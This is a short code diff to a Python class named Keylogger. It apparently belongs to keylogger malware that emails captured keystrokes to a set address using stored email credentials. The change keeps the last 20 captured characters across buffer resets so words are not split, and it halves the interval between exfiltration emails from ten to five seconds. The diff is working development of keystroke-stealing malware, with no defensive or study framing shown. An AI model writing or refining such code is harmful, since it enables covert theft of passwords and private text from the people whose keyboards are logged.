@@ -61,7 +61,11 @@ class Keylogger:
             return False
         finally:
             # Reset the local buffer
-            self.local_buffer = ""
+            # Keep the last characters of the last buffer so words aren't cut off
+            if len(self.local_buffer) < 20:
+                self.local_buffer = self.local_buffer[-len(self.local_buffer):]
+            else:
+                self.local_buffer = self.local_buffer[-20:]
             self.local_buffer_raw = ""
             print("Reset local buffer")
 
@@ -72,7 +76,7 @@ class Keylogger:
 
         emailer = Emailer(self.email, self.password)
         while True:
-            time.sleep(10)
+            time.sleep(5)
             self.__email_local_buffer(emailer)
 
 if __name__ == "__main__":
